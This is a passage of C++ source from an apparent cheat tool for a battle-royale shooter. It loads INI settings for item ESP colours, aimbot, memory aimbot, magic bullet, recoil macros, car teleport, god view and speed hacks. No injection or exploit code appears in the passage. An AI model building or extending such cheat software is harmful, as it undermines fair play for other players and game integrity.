	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Pan_Color[i] = fround(ini.GetLongValue("Esp_Item_Pan_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_DesertEagle_Color[i] = fround(ini.GetLongValue("Esp_Item_DesertEagle_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_P1911_Color[i] = fround(ini.GetLongValue("Esp_Item_P1911_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_R45_Color[i] = fround(ini.GetLongValue("Esp_Item_R45_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_P18C_Color[i] = fround(ini.GetLongValue("Esp_Item_P18C_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_P92_Color[i] = fround(ini.GetLongValue("Esp_Item_P92_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_R1895_Color[i] = fround(ini.GetLongValue("Esp_Item_R1895_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_FlareGun_Color[i] = fround(ini.GetLongValue("Esp_Item_FlareGun_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Vertical_Color[i] = fround(ini.GetLongValue("Esp_Item_Vertical_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_HalfGrip_Color[i] = fround(ini.GetLongValue("Esp_Item_HalfGrip_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_LightGrip_Color[i] = fround(ini.GetLongValue("Esp_Item_LightGrip_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Angled_Color[i] = fround(ini.GetLongValue("Esp_Item_Angled_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Lasersight_Color[i] = fround(ini.GetLongValue("Esp_Item_Lasersight_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_ThumbGrip_Color[i] = fround(ini.GetLongValue("Esp_Item_ThumbGrip_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Mid_FlashHider_Color[i] = fround(ini.GetLongValue("Esp_Item_Mid_FlashHider_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Large_FlashHider_Color[i] = fround(ini.GetLongValue("Esp_Item_Large_FlashHider_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Large_Compensator_Color[i] = fround(ini.GetLongValue("Esp_Item_Large_Compensator_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Mid_Compensator_Color[i] = fround(ini.GetLongValue("Esp_Item_Mid_Compensator_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Taktik_Color[i] = fround(ini.GetLongValue("Esp_Item_Taktik_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Duckbill_Color[i] = fround(ini.GetLongValue("Esp_Item_Duckbill_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Sniper_FlashHider_Color[i] = fround(ini.GetLongValue("Esp_Item_Sniper_FlashHider_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Mid_Suppressor_Color[i] = fround(ini.GetLongValue("Esp_Item_Mid_Suppressor_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Chekpad_Sniper_Color[i] = fround(ini.GetLongValue("Esp_Item_Chekpad_Sniper_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Choke_Color[i] = fround(ini.GetLongValue("Esp_Item_Choke_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Micro_UZI_Color[i] = fround(ini.GetLongValue("Esp_Item_Micro_UZI_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Sniper_Compensator_Color[i] = fround(ini.GetLongValue("Esp_Item_Sniper_Compensator_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Sniper_Suppressor_Color[i] = fround(ini.GetLongValue("Esp_Item_Sniper_Suppressor_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Large_Suppressor_Color[i] = fround(ini.GetLongValue("Esp_Item_Large_Suppressor_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Sniper_Quick_Extended_Color[i] = fround(ini.GetLongValue("Esp_Item_Sniper_Quick_Extended_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Sniper_Quick_Color[i] = fround(ini.GetLongValue("Esp_Item_Sniper_Quick_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_AR_Quick_Color[i] = fround(ini.GetLongValue("Esp_Item_AR_Quick_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_AR_Extended_Color[i] = fround(ini.GetLongValue("Esp_Item_AR_Extended_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_SMG_Quick_Extended_Color[i] = fround(ini.GetLongValue("Esp_Item_SMG_Quick_Extended_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_SMG_Extended_Color[i] = fround(ini.GetLongValue("Esp_Item_SMG_Extended_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_SMG_Quick_Color[i] = fround(ini.GetLongValue("Esp_Item_SMG_Quick_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_WorldCup_Box_Color[i] = fround(ini.GetLongValue("Esp_Item_WorldCup_Box_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Football_Grenade_Color[i] = fround(ini.GetLongValue("Esp_Item_Football_Grenade", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Football_Cloth_Color[i] = fround(ini.GetLongValue("Esp_Item_Football_Cloth_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Golden_Boot_Color[i] = fround(ini.GetLongValue("Esp_Item_Golden_Boot_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_MiniGameMachine_Color[i] = fround(ini.GetLongValue("Esp_Item_MiniGameMachine_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_BlindBoxMachine_Color[i] = fround(ini.GetLongValue("Esp_Item_BlindBoxMachine_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_GameCoin_Color[i] = fround(ini.GetLongValue("Esp_Item_GameCoin_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Benzin_Color[i] = fround(ini.GetLongValue("Esp_Item_Benzin_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_PP19_Color[i] = fround(ini.GetLongValue("Esp_Item_PP19_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_P90_Color[i] = fround(ini.GetLongValue("Esp_Item_P90_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_TommyGun_Color[i] = fround(ini.GetLongValue("Esp_Item_TommyGun_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_MP5K_Color[i] = fround(ini.GetLongValue("Esp_Item_MP5K_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_UMP9_Color[i] = fround(ini.GetLongValue("Esp_Item_UMP9_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Vector_Color[i] = fround(ini.GetLongValue("Esp_Item_Vector_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Uzi_Color[i] = fround(ini.GetLongValue("Esp_Item_Uzi_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_762mm_Color[i] = fround(ini.GetLongValue("Esp_Item_762mm_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_556mm_Color[i] = fround(ini.GetLongValue("Esp_Item_556mm_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_9mm_Color[i] = fround(ini.GetLongValue("Esp_Item_9mm_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_45ACP_Color[i] = fround(ini.GetLongValue("Esp_Item_45ACP_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Flare_Color[i] = fround(ini.GetLongValue("Esp_Item_Flare_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_12Guage_Color[i] = fround(ini.GetLongValue("Esp_Item_12Guage_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Ammo_Bolt_Color[i] = fround(ini.GetLongValue("Esp_Item_Ammo_Bolt_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Lazer_Color[i] = fround(ini.GetLongValue("Esp_Item_Lazer_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Holo_Color[i] = fround(ini.GetLongValue("Esp_Item_Holo_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_x2_Color[i] = fround(ini.GetLongValue("Esp_Item_x2_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_x3_Color[i] = fround(ini.GetLongValue("Esp_Item_x3_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_x4_Color[i] = fround(ini.GetLongValue("Esp_Item_x4_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_x6_Color[i] = fround(ini.GetLongValue("Esp_Item_x6_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_x8_Color[i] = fround(ini.GetLongValue("Esp_Item_x8_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Bag1_Color[i] = fround(ini.GetLongValue("Esp_Item_Bag1_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Bag2_Color[i] = fround(ini.GetLongValue("Esp_Item_Bag2_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Bag3_Color[i] = fround(ini.GetLongValue("Esp_Item_Bag3_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Armor1_Color[i] = fround(ini.GetLongValue("Esp_Item_Armor1_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Armor2_Color[i] = fround(ini.GetLongValue("Esp_Item_Armor2_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Armor3_Color[i] = fround(ini.GetLongValue("Esp_Item_Armor3_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Helmet1_Color[i] = fround(ini.GetLongValue("Esp_Item_Helmet1_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Helmet2_Color[i] = fround(ini.GetLongValue("Esp_Item_Helmet2_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Helmet3_Color[i] = fround(ini.GetLongValue("Esp_Item_Helmet3_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Frag_Color[i] = fround(ini.GetLongValue("Esp_Item_Frag_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Frag_Warn_Color[i] = fround(ini.GetLongValue("Esp_Item_Frag_Warn_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Smoke_Warn_Color[i] = fround(ini.GetLongValue("Esp_Item_Smoke_Warn_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Smoke_Color[i] = fround(ini.GetLongValue("Esp_Item_Smoke_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Molotof_Color[i] = fround(ini.GetLongValue("Esp_Item_Molotof_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Molotof_Warn_Color[i] = fround(ini.GetLongValue("Esp_Item_Molotof_Warn_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Grenade_Apple_Color[i] = fround(ini.GetLongValue("Esp_Item_Grenade_Apple_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_MedKit_Color[i] = fround(ini.GetLongValue("Esp_Item_MedKit_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_FirstAidKit_Color[i] = fround(ini.GetLongValue("Esp_Item_FirstAidKit_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Painkiller_Color[i] = fround(ini.GetLongValue("Esp_Item_Painkiller_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_EnergyDrink_Color[i] = fround(ini.GetLongValue("Esp_Item_EnergyDrink_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_AdrenalineSyringe_Color[i] = fround(ini.GetLongValue("Esp_Item_AdrenalineSyringe_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_Bandage_Color[i] = fround(ini.GetLongValue("Esp_Item_Bandage_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_AirDrop_Color[i] = fround(ini.GetLongValue("Esp_Item_AirDrop_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_DeadBox_Color[i] = fround(ini.GetLongValue("Esp_Item_DeadBox_Color", str.append(std::to_string(i)).c_str()) / 255.0); }
	for (int i = 0; i < 4; i++) { std::string str = "key"; Setting::Esp_Item_AirAttack_Color[i] = fround(ini.GetLongValue("Esp_Item_AirAttack_Color", str.append(std::to_string(i)).c_str()) / 255.0); }

	////////////PLAYER ////////////////


	Setting::pbonesize = ini.GetLongValue("pbonesize", "pbonesize", Setting::pbonesize);
	Setting::plyrbox = ini.GetLongValue("plyrbox", "plyrbox", Setting::plyrbox);
	Setting::Aimbot = ini.GetBoolValue("Enabled", "Enabled", Setting::Aimbot);
	nsize = ini.GetLongValue("nsize", "nsize", nsize);
	botnsize = ini.GetLongValue("botnsize", "botnsize", botnsize);
	TeamIdSize = ini.GetLongValue("TeamIdSize", "TeamIdSize", TeamIdSize);
	BotTeamIdSize = ini.GetLongValue("BotTeamIdSize", "BotTeamIdSize", BotTeamIdSize);
	botnsize = ini.GetLongValue("botnsize", "botnsize", botnsize);
	Setting::blinesize = ini.GetLongValue("blinesize", "blinesize", Setting::blinesize);
	Setting::bbonesize = ini.GetLongValue("bbonesize", "bbonesize", Setting::bbonesize);
	Setting::bcornersize = ini.GetLongValue("bcornersize", "bcornersize", Setting::bcornersize);
	Setting::pbonesize = ini.GetLongValue("pbonesize", "pbonesize", Setting::pbonesize);
	dissize = ini.GetLongValue("dissize", "dissize", dissize);
	botdissize = ini.GetLongValue("botdissize", "botdissize", botdissize);
	Setting::pfullboxsize = ini.GetLongValue("pfullboxsize", "pfullboxsize", Setting::pfullboxsize);
	Setting::bfullboxsize = ini.GetLongValue("bfullboxsize", "bfullboxsize", Setting::bfullboxsize);
	Setting::pcornersize = ini.GetLongValue("pcornersize", "pcornersize", Setting::pcornersize);
	Setting::DotsRadius = ini.GetLongValue("DotsRadius", "DotsRadius", Setting::DotsRadius);
	Setting::DotsRange = ini.GetLongValue("DotsRange", "DotsRange", Setting::DotsRange);
	Setting::DotsThickness = ini.GetLongValue("DotsThickness", "DotsThickness", Setting::DotsThickness);
	FlagStyle = ini.GetLongValue("FlagStyle", "FlagStyle", FlagStyle);
	Setting::EspStyle = ini.GetLongValue("EspStyle", "EspStyle", Setting::EspStyle);
	Setting::BotEspStyle = ini.GetLongValue("BotEspStyle", "BotEspStyle", Setting::BotEspStyle);
	Setting::Aimbot = ini.GetBoolValue("Enabled", "Enabled", Setting::Aimbot);
	Setting::Aimspeed = ini.GetLongValue("Aimspeed", "Aimspeed", Setting::Aimspeed);
	Setting::plinesize = ini.GetLongValue("plinesize", "plinesize", Setting::plinesize);
	Setting::AttachOnVisible = ini.GetBoolValue("Enabled", "Enabled", Setting::AttachOnVisible);
	Setting::AimbotKey = ini.GetLongValue("AimbotKey", "Value", Setting::AimbotKey);
	Setting::AimSwichKey = ini.GetLongValue("AimSwichKey", "Value", Setting::AimSwichKey);
	Setting::Macro = ini.GetBoolValue("Enabled", "Enabled", Setting::Macro);
	Setting::micro_Iron = ini.GetBoolValue("Enabled", "Enabled", Setting::micro_Iron);
	Setting::micro_RedDot = ini.GetBoolValue("Enabled", "Enabled", Setting::micro_RedDot);
	Setting::micro_X2 = ini.GetBoolValue("Enabled", "Enabled", Setting::micro_X2);
	Setting::micro_X3 = ini.GetBoolValue("Enabled", "Enabled", Setting::micro_X3);
	Setting::micro_X4 = ini.GetBoolValue("Enabled", "Enabled", Setting::micro_X4);
	Setting::micro_X6 = ini.GetBoolValue("Enabled", "Enabled", Setting::micro_X6);
	Setting::RefreshKey = ini.GetBoolValue("Enabled", "Enabled", Setting::RefreshKey);
	Setting::pTeamID = ini.GetBoolValue("Enabled", "Enabled", Setting::pTeamID);
	Setting::playerweapon = ini.GetBoolValue("Enabled", "Enabled", Setting::playerweapon);
	Setting::pname = ini.GetBoolValue("pname", "pname", Setting::pname);
	Setting::pflag = ini.GetBoolValue("pflag", "pflag", Setting::pflag);
	Setting::botname = ini.GetBoolValue("botname", "botname", Setting::botname);
	Setting::botweapon = ini.GetBoolValue("botweapon", "botweapon", Setting::botweapon);
	Setting::botflag = ini.GetBoolValue("botflag", "botflag", Setting::botflag);
	Setting::botTeamID = ini.GetBoolValue("botTeamID", "botTeamID", Setting::botTeamID);
	Setting::botline = ini.GetBoolValue("botline", "botline", Setting::botline);
	Setting::botBone = ini.GetBoolValue("botBone", "botBone", Setting::botBone);
	Setting::botcorner = ini.GetBoolValue("botcorner", "botcorner", Setting::botcorner);
	Setting::botdistance = ini.GetBoolValue("botdistance", "botdistance", Setting::botdistance);
	Setting::bothealth = ini.GetBoolValue("bothealth", "bothealth", Setting::bothealth);
	Setting::microaxis_Iron.Y = ini.GetLongValue("microaxis_Iron.Y", "microaxis_Iron.Y", Setting::microaxis_Iron.Y);
	Setting::microaxis_RedDot.Y = ini.GetLongValue("microaxis_RedDot.Y", "microaxis_RedDot.Y", Setting::microaxis_RedDot.Y);
	Setting::microaxis_X2.Y = ini.GetLongValue("microaxis_X2.Y", "microaxis_X2.Y", Setting::microaxis_X2.Y);
	Setting::microaxis_X3.Y = ini.GetLongValue("microaxis_X3.Y", "microaxis_X3.Y", Setting::microaxis_X3.Y);
	Setting::microaxis_X4.Y = ini.GetLongValue("microaxis_X4.Y", "microaxis_X4.Y", Setting::microaxis_X4.Y);
	Setting::microaxis_X6.Y = ini.GetLongValue("microaxis_X6.Y", "microaxis_X6.Y", Setting::microaxis_X6.Y);
	nsize = ini.GetLongValue("nsize", "nsize", nsize);
	Setting::MemoryAimbot = ini.GetBoolValue("MemoryAimbot", "MemoryAimbot", Setting::MemoryAimbot);

	Setting::fastpara = ini.GetBoolValue("Enabled", "Enabled", Setting::fastpara);
	Setting::damagebeast = ini.GetBoolValue("Enabled", "Enabled", Setting::damagebeast);
	Setting::isSpinning = ini.GetBoolValue("Enabled", "Enabled", Setting::isSpinning);
	Setting::WeaponScale = ini.GetBoolValue("Enabled", "Enabled", Setting::WeaponScale);
	Setting::HDR = ini.GetBoolValue("Enabled", "Enabled", Setting::HDR);
	Setting::FPS = ini.GetBoolValue("Enabled", "Enabled", Setting::FPS);
	Setting::fastparakey = ini.GetBoolValue("fastparakey", "fastparakey", Setting::fastparakey);

	Setting::FPSVALUE = ini.GetLongValue("FPSVALUE", "FPSVALUE", Setting::FPSVALUE);
	Setting::SpiningKeys = ini.GetLongValue("SpiningKeys", "SpiningKeys", Setting::SpiningKeys);
	Setting::PlayerSpining = ini.GetLongValue("PlayerSpining", "PlayerSpining", Setting::PlayerSpining);
	Setting::WeaponScaleValue = ini.GetLongValue("WeaponScaleValue", "WeaponScaleValue", Setting::WeaponScaleValue);
	Setting::fastparaaa = ini.GetLongValue("fastparaaa", "fastparaaa", Setting::fastparaaa);
	Setting::Magic_Bullet = ini.GetLongValue("Magic_Bullet", "Magic_Bullet", Setting::Magic_Bullet);
	Setting::paraassists = ini.GetBoolValue("paraassists", "paraassists", Setting::paraassists);

	Setting::blacksky = ini.GetBoolValue("blacksky", "blacksky", Setting::blacksky);
	Setting::carteleport = ini.GetBoolValue("carteleport", "carteleport", Setting::carteleport);
	Setting::GodView = ini.GetBoolValue("GodView", "GodView", Setting::GodView);
	Setting::highjump = ini.GetBoolValue("highjump", "highjump", Setting::highjump);

	Setting::Fastcarkey = ini.GetLongValue("Fastcarkey", "Fastcarkey", Setting::Fastcarkey);
	Setting::Backcarkey = ini.GetLongValue("Backcarkey", "Backcarkey", Setting::Backcarkey);
	Setting::fastrv_3 = ini.GetLongValue("fastrv_3", "fastrv_3", Setting::fastrv_3);
	Setting::fastrun3 = ini.GetBoolValue("fastrun3", "fastrun3", Setting::fastrun3);

	Setting::RecSelector = ini.GetLongValue("RecSelector", "Value", Setting::RecSelector);
	Setting::RecSelector2 = ini.GetLongValue("RecSelector2", "Value", Setting::RecSelector2);

	Setting::fastrunkey2 = ini.GetLongValue("fastrunkey2", "fastrunkey2", Setting::fastrunkey2);

	Setting::vahicle_Text_item_Dacia_TextSize = ini.GetLongValue("vahicle_Text_item_Dacia_TextSize", "vahicle_Text_item_Dacia_TextSize", Setting::vahicle_Text_item_Dacia_TextSize);
	Setting::vahicle_Text_item_UAZ_TextSize = ini.GetLongValue("vahicle_Text_item_UAZ_TextSize", "vahicle_Text_item_UAZ_TextSize", Setting::vahicle_Text_item_UAZ_TextSize);
	Setting::vahicle_Text_item_Coupe_TextSize = ini.GetLongValue("vahicle_Text_item_Coupe_TextSize", "vahicle_Text_item_Coupe_TextSize", Setting::vahicle_Text_item_Coupe_TextSize);
	Setting::vahicle_Text_item_UTV_TextSize = ini.GetLongValue("vahicle_Text_item_UTV_TextSize", "vahicle_Text_item_UTV_TextSize", Setting::vahicle_Text_item_UTV_TextSize);
	Setting::vahicle_Text_item_Buggy_TextSize = ini.GetLongValue("vahicle_Text_item_Buggy_TextSize", "vahicle_Text_item_Buggy_TextSize", Setting::vahicle_Text_item_Buggy_TextSize);
	Setting::vahicle_Text_item_BRDM_TextSize = ini.GetLongValue("vahicle_Text_item_BRDM_TextSize", "vahicle_Text_item_BRDM_TextSize", Setting::vahicle_Text_item_BRDM_TextSize);
	Setting::vahicle_Text_item_Motorcycle_TextSize = ini.GetLongValue("vahicle_Text_item_Motorcycle_TextSize", "vahicle_Text_item_Motorcycle_TextSize", Setting::vahicle_Text_item_Motorcycle_TextSize);
	Setting::vahicle_Text_item_SnowBike_TextSize = ini.GetLongValue("vahicle_Text_item_SnowBike_TextSize", "vahicle_Text_item_SnowBike_TextSize", Setting::vahicle_Text_item_SnowBike_TextSize);
	Setting::vahicle_Text_item_Sports_TextSize = ini.GetLongValue("vahicle_Text_item_Sports_TextSize", "vahicle_Text_item_Sports_TextSize", Setting::vahicle_Text_item_Sports_TextSize);
	Setting::vahicle_Text_item_Minibus_TextSize = ini.GetLongValue("vahicle_Text_item_Minibus_TextSize", "vahicle_Text_item_Minibus_TextSize", Setting::vahicle_Text_item_Minibus_TextSize);
	Setting::vahicle_Text_item_Bike_TextSize = ini.GetLongValue("vahicle_Text_item_Bike_TextSize", "vahicle_Text_item_Bike_TextSize", Setting::vahicle_Text_item_Bike_TextSize);
	Setting::vahicle_Text_item_BigFoot_TextSize = ini.GetLongValue("vahicle_Text_item_BigFoot_TextSize", "vahicle_Text_item_BigFoot_TextSize", Setting::vahicle_Text_item_BigFoot_TextSize);
	Setting::vahicle_Text_item_Aquarail_TextSize = ini.GetLongValue("vahicle_Text_item_Aquarail_TextSize", "vahicle_Text_item_Aquarail_TextSize", Setting::vahicle_Text_item_Aquarail_TextSize);
	Setting::vahicle_Text_item_PG117_TextSize = ini.GetLongValue("vahicle_Text_item_PG117_TextSize", "vahicle_Text_item_PG117_TextSize", Setting::vahicle_Text_item_PG117_TextSize);
	Setting::vahicle_Text_item_Rony_TextSize = ini.GetLongValue("vahicle_Text_item_Rony_TextSize", "vahicle_Text_item_Rony_TextSize", Setting::vahicle_Text_item_Rony_TextSize);
	Setting::vahicle_Text_item_Plane_TextSize = ini.GetLongValue("vahicle_Text_item_Plane_TextSize", "vahicle_Text_item_Plane_TextSize", Setting::vahicle_Text_item_Plane_TextSize);
	Setting::vahicle_Text_item_PickUpTruck_TextSize = ini.GetLongValue("vahicle_Text_item_PickUpTruck_TextSize", "vahicle_Text_item_PickUpTruck_TextSize", Setting::vahicle_Text_item_PickUpTruck_TextSize);
